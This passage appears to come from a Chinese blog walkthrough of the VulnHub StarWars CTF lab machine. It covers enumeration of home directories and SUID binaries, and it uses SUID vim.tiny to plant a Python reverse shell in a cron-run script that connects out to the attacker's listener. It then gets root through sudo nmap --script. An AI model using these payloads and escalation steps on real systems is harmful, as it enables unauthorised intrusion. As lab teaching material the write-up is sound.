preferred_lft 334sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe83:8040/64 scope link noprefixroute </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">han@starwars:~$ uname -a</span><br><span class="hljs-string">Linux starwars 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="hljs-string">han@starwars:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for han: </span><br><span class="hljs-string">Sorry, user han may not run sudo on starwars.</span><br></code></pre></td></tr></table></figure><p>看看用户家目录是否有敏感文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:~$ <span class="hljs-built_in">ls</span> -alih<br>total 32K<br>  170 drwxr-xr-x 4 han  han  4.0K Jul 23  2020 .<br>  193 drwxr-xr-x 5 root root 4.0K Jul 23  2020 ..<br>43122 -rw------- 1 han  han   483 Jul 24  2020 .bash_history<br>38236 -rw-r--r-- 1 han  han   220 Apr 18  2019 .bash_logout<br> 1748 -rw-r--r-- 1 han  han  3.5K Apr 18  2019 .bashrc<br>42430 drwx------ 3 han  han  4.0K Jul 23  2020 .gnupg<br> 1261 -rw-r--r-- 1 han  han   807 Apr 18  2019 .profile<br>41082 drwxr-xr-x 2 han  han  4.0K Jul 24  2020 .secrets<br></code></pre></td></tr></table></figure><p>关注历史命令文件和 <code>.secrets</code> 文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:~$ <span class="hljs-built_in">cat</span> .bash_history <br>sudo su<br><span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">mkdir</span> .secrets <br><span class="hljs-built_in">ls</span> <br><span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">cd</span> .secrets/<br><span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">touch</span> firsthalf.txt <br><span class="hljs-built_in">touch</span> note.txt<br><span class="hljs-built_in">echo</span> first half of the password is: luke12 &gt;&gt; firsthalf.txt <br><span class="hljs-built_in">cat</span> firsthalf.txt <br><span class="hljs-built_in">echo</span> Darth knows everything &gt;&gt; note.txt <br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">cd</span> .secrets/<br><span class="hljs-built_in">cat</span>  firsthalf.txt <br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> .secrets/<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">rm</span> firsthalf.txt <br><span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;r2d2 thinks you&#x27;re a cewl kid, what about anakin?&quot;</span> &gt; note.txt <br><span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Anakin is a cewl kid.&quot;</span> &gt; note.txt <br><span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">cd</span> ..<br>su Darth<br>sudo -l<br>su Darth<br><br>han@starwars:~$ <span class="hljs-built_in">cd</span> .secrets/<br>han@starwars:~/.secrets$ <span class="hljs-built_in">ls</span> -alih<br>total 12K<br>41082 drwxr-xr-x 2 han han 4.0K Jul 24  2020 .<br>  170 drwxr-xr-x 4 han han 4.0K Jul 23  2020 ..<br>43245 -rw-r----- 1 han han   22 Jul 24  2020 note.txt<br>han@starwars:~/.secrets$ <span class="hljs-built_in">cat</span> note.txt<br>Anakin is a cewl kid.<br><br></code></pre></td></tr></table></figure><p>拿到了前一半的密码，和 “Anakin is a cewl kid.” 的提示，接下来看看别的用户的家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:~/.secrets$ <span class="hljs-built_in">cd</span> /home/Darth<br>han@starwars:/home/Darth$ <span class="hljs-built_in">ls</span> -alih<br>total 44K<br>43137 drwxr-xr-x 5 Darth Darth 4.0K Jul 24  2020 .<br>  193 drwxr-xr-x 5 root  root  4.0K Jul 23  2020 ..<br>43125 -rw------- 1 Darth Darth 2.3K Jul 24  2020 .bash_history<br>43304 -rw-r--r-- 1 Darth Darth  220 Apr 18  2019 .bash_logout<br>43303 -rw-r--r-- 1 Darth Darth 3.5K Apr 18  2019 .bashrc<br>43305 drwx------ 3 Darth Darth 4.0K Jul 23  2020 .gnupg<br> 1419 -rw------- 1 Darth Darth   42 Jul 24  2020 .lesshst<br> 1415 drwxr-xr-x 3 Darth Darth 4.0K Jul 24  2020 .<span class="hljs-built_in">local</span><br>43302 -rw-r--r-- 1 Darth Darth  807 Apr 18  2019 .profile<br> 1420 drwxr-xr-x 2 Darth Darth 4.0K Jul 24  2020 .secrets<br> 1414 -rw-r--r-- 1 Darth Darth   66 Jul 24  2020 .selected_editor<br>han@starwars:/home/Darth$ <span class="hljs-built_in">cd</span> .secrets/<br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">ls</span> -alih<br>total 12K<br> 1420 drwxr-xr-x 2 Darth Darth  4.0K Jul 24  2020 .<br>43137 drwxr-xr-x 5 Darth Darth  4.0K Jul 24  2020 ..<br> 1425 -rwxrw-r-- 1 Darth anakin  105 Jul 24  2020 evil.py<br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">cat</span> evil.py<br><span class="hljs-comment"># Let the fear flow through you every single minute</span><br><br>fear = 1<br>anger = fear<br>hate = anger<br>suffering = hate<br></code></pre></td></tr></table></figure><p>Darth 有个定时每分钟执行任务的脚本，或许可以被利用，但是这个文件只有 anakin 组的用户才能修改，我只能读取。上传个 pspy 来确认这个定时脚本是运行的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">2023/10/02 08:12:01 CMD: UID=0     PID=17682  | /usr/sbin/CRON -f <br>2023/10/02 08:12:01 CMD: UID=0     PID=17683  | /usr/sbin/CRON -f <br>2023/10/02 08:12:01 CMD: UID=1002  PID=17684  | /bin/sh -c python /home/Darth/.secrets/evil.py<br></code></pre></td></tr></table></figure><p>看看 skywalker 的家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/home/skywalker$ <span class="hljs-built_in">cd</span> .secrets/<br>han@starwars:/home/skywalker/.secrets$ <span class="hljs-built_in">ls</span> -laih<br>total 12K<br>43115 drwxr-xr-x 2 skywalker skywalker 4.0K Jul 24  2020 .<br>37181 drwxr-xr-x 5 skywalker skywalker 4.0K Jul 24  2020 ..<br>39574 -rw-r----- 1 skywalker skywalker   50 Jul 24  2020 note.txt<br>han@starwars:/home/skywalker/.secrets$ <span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">cat</span>: note.txt: Permission denied<br></code></pre></td></tr></table></figure><p>没有读取权限，再去看看网站根目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/tmp$ <span class="hljs-built_in">cd</span> /var/www/html<br>han@starwars:/var/www/html$ <span class="hljs-built_in">ls</span><br>admin  images  index.html  r2d2  robots.txt  users.js  wordpress<br>han@starwars:/var/www/html$ <span class="hljs-built_in">cd</span> wordpress<br>-bash: <span class="hljs-built_in">cd</span>: wordpress: Not a directory<br>han@starwars:/var/www/html$ <span class="hljs-built_in">ls</span> -alih<br>total 36K<br> 8085 drwxr-xr-x 3 root root 4.0K Jul 25  2020 .<br> 8084 drwxr-xr-x 3 root root 4.0K Jul 20  2020 ..<br>37079 -rw-r--r-- 1 root root 3.7K Jul 23  2020 admin<br>36973 drwxr-xr-x 2 root root 4.0K Jul 23  2020 images<br>36309 -rw-r--r-- 1 root root  548 Jul 23  2020 index.html<br>42292 -rw-r--r-- 1 root root 3.3K Jul 23  2020 r2d2<br>39330 -rw-r--r-- 1 root root  105 Jul 23  2020 robots.txt<br>41183 -rw-r--r-- 1 root root   16 Jul 23  2020 users.js<br>41060 -rw-r--r-- 1 root root   54 Jul 23  2020 wordpress<br></code></pre></td></tr></table></figure><p>查看 SUID 和定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/var$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   147279    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   143107     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   390885     16 -rwsr-sr-x   1 root     root          14608 Mar  5  2019 /usr/lib/xorg/Xorg.wrap<br>   264227     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   143141     20 -rwsr-xr-x   1 root     root          18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   129321     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd<br>   129319     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh<br>   132702     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp<br>   133176     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount<br>   143139     24 -rwsr-xr-x   1 root     root          23288 Jan 15  2019 /usr/bin/pkexec<br>   156384     56 -rwsr-xr-x   1 root     root          55400 Mar  6  2019 /usr/bin/bwrap<br>   132849     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su<br>   136952   1176 -rwsrwsrwx   1 root     root        1200696 Jun 15  2019 /usr/bin/vim.tiny<br>   143296     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount<br>   176421   2844 -rwsr-xr-x   1 root     root        2911160 Dec 12  2018 /usr/bin/nmap<br>   133174     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount<br>   129322     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd<br>   129318     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn<br>   143313    152 -rwsr-xr-x   1 root     root         154352 Mar 21  2019 /usr/bin/ntfs-3g<br>   173131    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo<br>   172781    380 -rwsr-xr--   1 root     dip          386792 Feb 20  2020 /usr/sbin/pppd<br><br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>SUID 中 vim.tiny 和 nmap 或许有可以利用的地方</p><p><img src="/pic/fe68030205a468a1bf3149444e76e84b_MD5.png"></p><p>或许可以用于读取，写入一些原本没有读写权限的文件</p><h2 id="SUID-VIM-读写定时脚本反弹-shell"><a href="#SUID-VIM-读写定时脚本反弹-shell" class="headerlink" title="SUID VIM 读写定时脚本反弹 shell"></a>SUID VIM 读写定时脚本反弹 shell</h2><p>尝试修改 evil.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.106&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span> &gt; evil.py<br>-bash: evil.py: Permission denied<br>han@starwars:/home/Darth/.secrets$ vim.tiny evil.py  <br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">cat</span> evil.py <br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="hljs-number">192.168</span>.<span class="hljs-number">56.106</span>&quot;,<span class="hljs-number">443</span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="hljs-string">&quot;sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>提前开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/StarWars_Epi1_CTF]<br>└─$ sudo nc -lvnp 443                             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.147] 37906<br>$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>Darth<br>$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1002(Darth) gid=1002(Darth) <span class="hljs-built_in">groups</span>=1002(Darth),27(sudo),2000(anakin)<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> <br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>Darth@starwars:~$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 44K<br>43137 drwxr-xr-x 5 Darth Darth 4.0K Jul 24  2020 .<br>  193 drwxr-xr-x 5 root  root  4.0K Jul 23  2020 ..<br>43125 -rw------- 1 Darth Darth 2.3K Jul 24  2020 .bash_history<br>43304 -rw-r--r-- 1 Darth Darth  220 Apr 18  2019 .bash_logout<br>43303 -rw-r--r-- 1 Darth Darth 3.5K Apr 18  2019 .bashrc<br>43305 drwx------ 3 Darth Darth 4.0K Jul 23  2020 .gnupg<br> 1419 -rw------- 1 Darth Darth   42 Jul 24  2020 .lesshst<br> 1415 drwxr-xr-x 3 Darth Darth 4.0K Jul 24  2020 .<span class="hljs-built_in">local</span><br>43302 -rw-r--r-- 1 Darth Darth  807 Apr 18  2019 .profile<br> 1420 drwxr-xr-x 2 Darth Darth 4.0K Oct  2 09:26 .secrets<br> 1414 -rw-r--r-- 1 Darth Darth   66 Jul 24  2020 .selected_editor<br>Darth@starwars:~$ sudo -l       <br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> Darth on starwars:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User Darth may run the following commands on starwars:<br>    (ALL) NOPASSWD: /usr/bin/nmap<br></code></pre></td></tr></table></figure><h2 id="sudo-nmap-提权"><a href="#sudo-nmap-提权" class="headerlink" title="sudo nmap 提权"></a>sudo nmap 提权</h2><p>借助 gtfobins 来查看提权手法，<code>--interactive</code> 参数由于版本问题，不支持，因此使用运行可控的 nmap 脚本来提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Darth@starwars:~$ sudo /usr/bin/nmap --interactive<br>sudo /usr/bin/nmap --interactive<br>/usr/bin/nmap: unrecognized option <span class="hljs-string">&#x27;--interactive&#x27;</span><br>See the output of nmap -h <span class="hljs-keyword">for</span> a summary of options.<br>Darth@starwars:~$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>Darth@starwars:/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>pulse-PKdhtXMmr18n<br>systemd-private-88d98199aeff4b95840bfa9330947e54-apache2.service-v542CT<br>systemd-private-88d98199aeff4b95840bfa9330947e54-ModemManager.service-HniTNs<br>systemd-private-88d98199aeff4b95840bfa9330947e54-systemd-timesyncd.service-K1oC4C<br>Darth@starwars:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-built_in">test</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-built_in">test</span><br>Darth@starwars:/tmp$ sudo /usr/bin/nmap --script=<span class="hljs-built_in">test</span><br>sudo /usr/bin/nmap --script=<span class="hljs-built_in">test</span><br>Starting Nmap 7.70 ( https://nmap.org ) at 2023-10-02 09:29 EDT<br>NSE: Warning: Loading <span class="hljs-string">&#x27;test&#x27;</span> -- the recommended file extension is <span class="hljs-string">&#x27;.nse&#x27;</span>.<br><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>寻找flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:83:80:40 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.147/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3<br>       valid_lft 364sec preferred_lft 364sec<br>    inet6 fe80::a00:27ff:fe83:8040/64 scope <span class="hljs-built_in">link</span> noprefixroute <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br>Linux starwars 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls -liah</span><br>total 376K<br>  195 drwx------ 16 root root 4.0K Jul 25  2020 .<br>    2 drwxr-xr-x 19 root root 4.0K Jul 20  2020 ..<br> 1258 -rw-------  1 root root 4.4K Jul 24  2020 .bash_history<br>  247 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>  142 drwx------  6 root root 4.0K Jul 22  2020 .cache<br>  175 drwxr-xr-x  7 root root 4.0K Jul 23  2020 .config<br>  209 drwxr-xr-x  2 root root 4.0K Jul 23  2020 Desktop<br>  148 -rw-r--r--  1 root root   35 Jul 20  2020 .dmrc<br>  258 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Documents<br>  210 drwxr-xr-x  2 root root 4.0K Jul 22  2020 Downloads<br>37235 -rw-r--r--  1 root root  793 Jul 23  2020 flag.txt<br>  171 drwx------  3 root root 4.0K Jul 20  2020 .gnupg<br> 1438 -rw-------  1 root root 2.6K Jul 25  2020 .ICEauthority<br>  404 drwxr-xr-x  3 root root 4.0K Jul 20  2020 .<span class="hljs-built_in">local</span><br> 1250 drwx------  5 root root 4.0K Jul 22  2020 .mozilla<br>  265 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Music<br> 1273 -rw-r--r--  1 root root 240K Jul 24  2020 nmap-4.53.tar.bz2.2<br>  297 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Pictures<br>  246 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>  254 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Public<br>36714 drwx------  2 root root 4.0K Jul 22  2020 .ssh<br>  212 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Templates<br>  308 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Videos<br>  173 -rw-------  1 root root   53 Jul 25  2020 .Xauthority<br>  518 -rw-r--r--  1 root root  11K Jul 25  2020 .xfce4-session.verbose-log<br>  474 -rw-r--r--  1 root root  19K Jul 24  2020 .xfce4-session.verbose-log.last<br> 1271 -rw-------  1 root root 3.0K Jul 25  2020 .xsession-errors<br>  174 -rw-------  1 root root 3.4K Jul 24  2020 .xsession-errors.old<br><span class="hljs-comment"># cat flag.txt</span><br>    .-.<br>                      |_:_|<br>                     /(_Y_)\<br>.                   ( \/M\/ )<br> <span class="hljs-string">&#x27;.               _.&#x27;</span>-/<span class="hljs-string">&#x27;-&#x27;</span>\-<span class="hljs-string">&#x27;._</span><br><span class="hljs-string">   &#x27;</span>:           _/.--<span class="hljs-string">&#x27;[[[[]&#x27;</span>--.\_<br>     <span class="hljs-string">&#x27;:        /_&#x27;</span>  : |::<span class="hljs-string">&quot;| :  &#x27;.\</span><br><span class="hljs-string">       &#x27;:     //   ./ |oUU| \.&#x27;  :\</span><br><span class="hljs-string">         &#x27;:  _:&#x27;..&#x27; \_|___|_/ :   :|</span><br><span class="hljs-string">           &#x27;:.  .&#x27;  |_[___]_|  :.&#x27;:\</span><br><span class="hljs-string">            [::\ |  :  | |  :   ; : \</span><br><span class="hljs-string">             &#x27;-&#x27;   \/&#x27;.| |.&#x27; \  .;.&#x27; |</span><br><span class="hljs-string">             |\_    \  &#x27;-&#x27;   :       |</span><br><span class="hljs-string">             |  \    \ .:    :   |   |</span><br><span class="hljs-string">             |   \    | &#x27;.   :    \  |</span><br><span class="hljs-string">             /       \   :. .;       |</span><br><span class="hljs-string">            /     |   |  :__/     :  \\</span><br><span class="hljs-string">           |  |   |    \:   | \   |   ||</span><br><span class="hljs-string">          /    \  : :  |:   /  |__|   /|</span><br><span class="hljs-string">      snd |     : : :_/_|  /&#x27;._\  &#x27;--|_\</span><br><span class="hljs-string">          /___.-/_|-&#x27;   \  \</span><br><span class="hljs-string">                         &#x27;-&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">I hope you liked it Padawan :)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Quaoar 靶机</title>
